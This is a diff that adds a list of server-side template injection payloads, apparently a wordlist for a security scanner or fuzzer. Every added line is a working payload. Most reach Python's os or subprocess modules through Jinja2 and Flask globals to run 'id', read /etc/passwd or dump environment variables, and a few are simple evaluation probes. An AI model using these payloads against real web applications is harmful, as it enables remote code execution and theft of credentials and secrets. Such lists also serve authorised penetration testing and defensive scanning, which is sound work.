@@ -1,0 +1,16 @@
+# --- New SSTI Variants ---
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ [].__class__.__base__.__subclasses__()[213]('id',shell=True,stdout=-1).communicate() }}
+{{ config.__class__.__init__.__globals__['os'].environ }}
+{{ ''.__class__.__mro__[1].__subclasses__()|selectattr('__module__', 'match', 'os')|map('__call__', 'id')|first }}
+{%%20set%20x%20=%20request.application.__globals__.__builtins__.__import__('os')%20%}{{x.popen('id').read()}}
